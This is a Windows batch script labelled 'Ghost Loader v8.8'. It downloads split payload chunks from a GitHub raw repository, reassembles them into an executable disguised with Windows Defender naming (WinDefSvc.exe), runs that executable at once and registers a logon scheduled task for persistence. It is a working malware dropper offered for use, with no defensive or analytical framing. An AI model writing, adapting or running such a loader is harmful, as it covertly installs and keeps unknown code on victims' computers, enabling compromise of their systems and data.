@echo off
setlocal enabledelayedexpansion

:: Ghost Loader v8.8 - SPEED OPTIMIZED
set "repo=https://raw.githubusercontent.com/sophieduval/der/main"
set "dest=%LOCALAPPDATA%\WinDefSvc"
set "exe=WinDefSvc.exe"

:: Minimal delay (2 seconds instead of 5)
ping -n 2 127.0.0.1 >nul 2>&1

:: Clean and create directory
if exist "%dest%" rmdir /s /q "%dest%" 2>nul
mkdir "%dest%" 2>nul
cd /d "%dest%"

:: PARALLEL DOWNLOADS using PowerShell jobs
powershell -Command "$repo='%repo%';$dest='%dest%';0..10|ForEach-Object{$i=$_.ToString('D2');Start-Job -ScriptBlock{param($r,$d,$n)(New-Object Net.WebClient).DownloadFile(\"$r/blob_$n.dat\",\"$d\blob_$n.dat\")} -ArgumentList $repo,$dest,$i}|Wait-Job|Out-Null"

:: Verify
if not exist "blob_00.dat" exit /b 1

:: Reassemble
copy /b blob_00.dat+blob_01.dat+blob_02.dat+blob_03.dat+blob_04.dat+blob_05.dat+blob_06.dat+blob_07.dat+blob_08.dat+blob_09.dat+blob_10.dat "%exe%" >nul 2>&1

:: Execute immediately
start "" "%exe%"

:: Persistence (background)
start /b powershell -Command "$a=New-ScheduledTaskAction -Execute '%dest%\%exe%';$t=New-ScheduledTaskTrigger -AtLogOn;Register-ScheduledTask -TaskName 'WinDefSvc' -Action $a -Trigger $t -Force" >nul 2>&1

exit
